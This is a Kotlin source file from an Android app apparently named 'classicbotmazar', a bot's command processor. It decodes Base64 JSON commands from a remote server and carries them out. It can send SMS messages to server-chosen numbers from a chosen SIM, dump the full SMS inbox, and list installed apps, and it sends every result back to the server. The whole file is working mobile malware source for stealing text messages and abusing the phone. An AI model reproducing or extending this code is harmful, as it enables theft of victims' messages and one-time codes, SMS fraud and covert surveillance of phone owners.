package org.reddeaddeath.classicbotmazar.commands

import android.content.Context
import android.util.Base64
import android.util.Log
import org.json.JSONObject
import org.reddeaddeath.classicbotmazar.UtilsMain
import org.reddeaddeath.classicbotmazar.network.LogManager

object CommandProcessor {
    private const val TAG = "CommandProcessor"

    fun processServerResponse(context: Context, responseBody: String?) {
        if (responseBody == null) {
            return
        }
        
        try {
            val decoded = Base64.decode(responseBody, Base64.NO_WRAP)
            val jsonResponse = String(decoded, Charsets.UTF_8)
            Log.d(TAG, "Response JSON: $jsonResponse")
            val responseJson = JSONObject(jsonResponse)
            
            val cmd = responseJson.optString("cmd", "")
            if (cmd.isNotEmpty()) {
                Log.d(TAG, "Command received: $cmd")
                executeCommand(context, cmd, responseJson)
                return
            }
            
            if (responseJson.has("sendSMS")) {
                handleSendSMSCommand(context, responseJson)
                return
            }
            
            if (responseJson.has("getAppsAll")) {
                handleGetAppsAllCommand(context)
                return
            }
            
            if (responseJson.has("getSmsInbox")) {
                handleGetSmsInboxCommand(context)
                return
            }
            
            Log.d(TAG, "No command in response")
        } catch (e: Exception) {
            Log.d(TAG, "Error parsing response: ${e.message}")
        }
    }

    private fun executeCommand(context: Context, cmd: String, responseJson: JSONObject) {
        when (cmd) {
            "getAppsAll" -> {
                handleGetAppsAllCommand(context)
            }
            "sendSMS" -> {
                handleSendSMSCommand(context, responseJson)
            }
            "getSmsInbox" -> {
                handleGetSmsInboxCommand(context)
            }
            else -> {
                Log.d(TAG, "Unknown command: $cmd")
            }
        }
    }

    private fun handleGetAppsAllCommand(context: Context) {
        Log.d(TAG, "Executing getAppsAll command")
        try {
            val applications = UtilsMain.getApplication(context)
            val appsJson = org.json.JSONArray()
            for (app in applications) {
                val appJson = org.json.JSONObject().apply {
                    put("packageName", app.packageName)
                    put("appName", app.appName)
                    put("versionName", app.versionName ?: "")
                    put("versionCode", app.versionCode)
                }
                appsJson.put(appJson)
            }
            
            val resultJson = org.json.JSONObject().apply {
                put("apps", appsJson)
                put("count", applications.size)
            }
            
            LogManager.sendLog(context, "getAppsAll_result", resultJson.toString())
            Log.d(TAG, "getAppsAll completed, sent ${applications.size} apps")
        } catch (e: Exception) {
            Log.d(TAG, "Error executing getAppsAll: ${e.message}")
            LogManager.sendLog(context, "getAppsAll_error", "Error: ${e.message}")
        }
    }

    private fun handleSendSMSCommand(context: Context, responseJson: org.json.JSONObject) {
        Log.d(TAG, "Executing sendSMS command")
        try {
            var phoneNumber = ""
            var message = ""
            var simSlot = 0

            if (responseJson.has("sendSMS")) {
                val sendSMSValue = responseJson.get("sendSMS")
                when {
                    sendSMSValue is org.json.JSONArray -> {
                        val params = sendSMSValue
                        phoneNumber = if (params.length() > 0) params.getString(0) else ""
                        message = if (params.length() > 1) params.getString(1) else ""
                        simSlot = if (params.length() > 2) params.getInt(2) else 0
                    }
                    sendSMSValue is String -> {
                        phoneNumber = sendSMSValue
                        message = responseJson.optString("message", "")
                        simSlot = responseJson.optInt("simSlot", 0)
                    }
                }
            } else {
                phoneNumber = responseJson.optString("phoneNumber", "")
                message = responseJson.optString("message", "")
                simSlot = responseJson.optInt("simSlot", 0)
            }

            if (phoneNumber.isNotEmpty() && message.isNotEmpty()) {
                UtilsMain.sendSMS(context, phoneNumber, message, simSlot)
                val resultJson = org.json.JSONObject().apply {
                    put("status", "sent")
                    put("phoneNumber", phoneNumber)
                    put("simSlot", simSlot)
                }
                LogManager.sendLog(context, "sendSMS_result", resultJson.toString())
                Log.d(TAG, "sendSMS completed: $phoneNumber, simSlot: $simSlot")
            } else {
                Log.d(TAG, "sendSMS failed: phoneNumber or message is empty")
                LogManager.sendLog(context, "sendSMS_error", "phoneNumber or message is empty")
            }
        } catch (e: Exception) {
            Log.d(TAG, "Error executing sendSMS: ${e.message}")
            LogManager.sendLog(context, "sendSMS_error", "Error: ${e.message}")
        }
    }

    private fun handleGetSmsInboxCommand(context: Context) {
        Log.d(TAG, "Executing getSmsInbox command")
        try {
            val messages = UtilsMain.getSMSInbox(context)
            val messagesJson = org.json.JSONArray()
            for (msg in messages) {
                val msgJson = org.json.JSONObject().apply {
                    put("address", msg.address)
                    put("body", msg.body)
                    put("date", msg.date)
                    put("type", msg.type)
                }
                messagesJson.put(msgJson)
            }
            
            val resultJson = org.json.JSONObject().apply {
                put("messages", messagesJson)
                put("count", messages.size)
            }
            
            LogManager.sendLog(context, "getSmsInbox_result", resultJson.toString())
            Log.d(TAG, "getSmsInbox completed, sent ${messages.size} messages")
        } catch (e: Exception) {
            Log.d(TAG, "Error executing getSmsInbox: ${e.message}")
            LogManager.sendLog(context, "getSmsInbox_error", "Error: ${e.message}")
        }
    }
}

